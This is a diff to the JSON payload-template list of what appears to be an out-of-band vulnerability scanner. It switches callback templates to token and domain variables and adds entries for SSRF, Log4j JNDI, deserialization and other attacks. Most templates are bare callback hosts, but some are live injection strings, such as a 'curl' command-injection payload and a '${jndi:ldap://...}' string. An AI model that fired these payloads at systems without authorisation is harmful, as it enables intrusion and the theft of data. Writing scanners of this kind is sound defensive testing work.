@@ -4,7 +4,7 @@
       "id": "ssrf-http",
       "name": "SSRF HTTP",
       "description": "Server-Side Request Forgery detection via HTTP",
-      "template": "{{.Token}}.oast.example.com",
+      "template": "{{.token}}.{{.domain}}",
       "variables": {},
       "category": "ssrf",
       "risk": "high"
@@ -13,7 +13,7 @@
       "id": "ssrf-cloud-metadata",
       "name": "SSRF Cloud Metadata",
       "description": "Cloud metadata endpoint detection",
-      "template": "{{.Token}}.169.254.169.254",
+      "template": "{{.token}}.169.254.169.254.{{.domain}}",
       "variables": {},
       "category": "ssrf",
       "risk": "critical"
@@ -22,7 +22,7 @@
       "id": "xxe-external-entity",
       "name": "XXE External Entity",
       "description": "XML External Entity injection",
-      "template": "{{.Token}}.oast.example.com/xxe.dtd",
+      "template": "http://{{.token}}.{{.domain}}/xxe.dtd",
       "variables": {},
       "category": "injection",
       "risk": "high"
@@ -31,7 +31,7 @@
       "id": "rfi-remote-file",
       "name": "RFI Remote File Inclusion",
       "description": "Remote File Inclusion detection",
-      "template": "http://{{.Token}}.oast.example.com/file.php",
+      "template": "http://{{.token}}.{{.domain}}/file.php",
       "variables": {},
       "category": "injection",
       "risk": "high"
@@ -40,7 +40,7 @@
       "id": "rce-command",
       "name": "RCE Command Injection",
       "description": "Remote Code Execution via command injection",
-      "template": "curl http://{{.Token}}.oast.example.com",
+      "template": "curl http://{{.token}}.{{.domain}}",
       "variables": {},
       "category": "rce",
       "risk": "critical"
@@ -49,7 +49,7 @@
       "id": "blind-sqli-dns",
       "name": "Blind SQLi DNS",
       "description": "Blind SQL injection via DNS exfiltration",
-      "template": "{{.Token}}.oast.example.com",
+      "template": "{{.token}}.{{.domain}}",
       "variables": {},
       "category": "sqli",
       "risk": "high"
@@ -58,7 +58,7 @@
       "id": "ssti-template",
       "name": "SSTI Template Injection",
       "description": "Server-Side Template Injection",
-      "template": "{{.Token}}.oast.example.com",
+      "template": "{{.token}}.{{.domain}}",
       "variables": {},
       "category": "injection",
       "risk": "high"
@@ -67,7 +67,7 @@
       "id": "cors-jsonp",
       "name": "CORS/JSONP",
       "description": "CORS misconfiguration and JSONP detection",
-      "template": "{{.Token}}.oast.example.com/callback",
+      "template": "{{.token}}.{{.domain}}/callback",
       "variables": {},
       "category": "misconfiguration",
       "risk": "medium"
@@ -76,7 +76,7 @@
       "id": "smtp-injection",
       "name": "SMTP Injection",
       "description": "SMTP header injection",
-      "template": "{{.Token}}.oast.example.com",
+      "template": "{{.token}}@{{.domain}}",
       "variables": {},
       "category": "injection",
       "risk": "medium"
@@ -85,7 +85,7 @@
       "id": "pdf-html-rendering",
       "name": "PDF/HTML Rendering",
       "description": "PDF or HTML rendering with external resources",
-      "template": "http://{{.Token}}.oast.example.com/resource",
+      "template": "http://{{.token}}.{{.domain}}/resource",
       "variables": {},
       "category": "client-side",
       "risk": "medium"
@@ -94,7 +94,7 @@
       "id": "webhook",
       "name": "Webhook",
       "description": "Webhook endpoint detection",
-      "template": "https://{{.Token}}.oast.example.com/webhook",
+      "template": "https://{{.token}}.{{.domain}}/webhook",
       "variables": {},
       "category": "api",
       "risk": "low"
@@ -103,9 +103,180 @@
       "id": "ci-cd-variable",
       "name": "CI/CD Variable",
       "description": "CI/CD pipeline variable injection",
-      "template": "{{.Token}}.oast.example.com",
+      "template": "{{.token}}.{{.domain}}",
       "variables": {},
       "category": "devops",
+      "risk": "high"
+    },
+    {
+      "id": "deserialization",
+      "name": "Deserialization",
+      "description": "Java/Python/PHP deserialization attack",
+      "template": "http://{{.token}}.{{.domain}}/object",
+      "variables": {},
+      "category": "injection",
+      "risk": "critical"
+    },
+    {
+      "id": "ldap-injection",
+      "name": "LDAP Injection",
+      "description": "LDAP query injection",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "injection",
+      "risk": "high"
+    },
+    {
+      "id": "smb-relay",
+      "name": "SMB Relay",
+      "description": "SMB NTLM relay attack",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "network",
+      "risk": "critical"
+    },
+    {
+      "id": "ftp-exfil",
+      "name": "FTP Exfiltration",
+      "description": "FTP data exfiltration",
+      "template": "ftp://{{.token}}.{{.domain}}/data",
+      "variables": {},
+      "category": "network",
+      "risk": "high"
+    },
+    {
+      "id": "dns-rebinding",
+      "name": "DNS Rebinding",
+      "description": "DNS rebinding attack for SSRF",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "network",
+      "risk": "high"
+    },
+    {
+      "id": "ssrf-redirect",
+      "name": "SSRF Redirect",
+      "description": "Open redirect via SSRF",
+      "template": "http://{{.token}}.{{.domain}}/redirect",
+      "variables": {},
+      "category": "ssrf",
+      "risk": "high"
+    },
+    {
+      "id": "graphql-introspection",
+      "name": "GraphQL Introspection",
+      "description": "GraphQL API introspection",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "api",
+      "risk": "medium"
+    },
+    {
+      "id": "xss-reflected",
+      "name": "XSS Reflected",
+      "description": "Reflected XSS detection",
+      "template": "http://{{.token}}.{{.domain}}/xss",
+      "variables": {},
+      "category": "client-side",
+      "risk": "medium"
+    },
+    {
+      "id": "prototype-pollution",
+      "name": "Prototype Pollution",
+      "description": "JavaScript prototype pollution",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "injection",
+      "risk": "high"
+    },
+    {
+      "id": "host-header-injection",
+      "name": "Host Header Injection",
+      "description": "Host header injection",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "injection",
+      "risk": "medium"
+    },
+    {
+      "id": "log4j-jndi",
+      "name": "Log4j JNDI",
+      "description": "Log4j JNDI injection",
+      "template": "${jndi:ldap://{{.token}}.{{.domain}}/exp}",
+      "variables": {},
+      "category": "injection",
+      "risk": "critical"
+    },
+    {
+      "id": "yaml-deserialization",
+      "name": "YAML Deserialization",
+      "description": "YAML deserialization attack",
+      "template": "http://{{.token}}.{{.domain}}/yaml",
+      "variables": {},
+      "category": "injection",
+      "risk": "critical"
+    },
+    {
+      "id": "jwt-confusion",
+      "name": "JWT Confusion",
+      "description": "JWT algorithm confusion",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "auth",
+      "risk": "high"
+    },
+    {
+      "id": "ssrf-gcp-metadata",
+      "name": "SSRF GCP Metadata",
+      "description": "Google Cloud Platform metadata",
+      "template": "metadata.google.internal.{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "ssrf",
+      "risk": "critical"
+    },
+    {
+      "id": "ssrf-azure-metadata",
+      "name": "SSRF Azure Metadata",
+      "description": "Azure cloud metadata",
+      "template": "169.254.169.254.{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "ssrf",
+      "risk": "critical"
+    },
+    {
+      "id": "request-smuggling",
+      "name": "Request Smuggling",
+      "description": "HTTP request smuggling",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "network",
+      "risk": "critical"
+    },
+    {
+      "id": "ssrf-aws-metadata",
+      "name": "SSRF AWS Metadata",
+      "description": "AWS EC2 metadata",
+      "template": "169.254.169.254.{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "ssrf",
+      "risk": "critical"
+    },
+    {
+      "id": "file-inclusion",
+      "name": "File Inclusion",
+      "description": "Local/Remote file inclusion",
+      "template": "http://{{.token}}.{{.domain}}/include",
+      "variables": {},
+      "category": "injection",
+      "risk": "high"
+    },
+    {
+      "id": "template-injection",
+      "name": "Template Injection",
+      "description": "Jinja2/ERB/Freemarker template injection",
+      "template": "{{.token}}.{{.domain}}",
+      "variables": {},
+      "category": "injection",
       "risk": "high"
     }
   ]
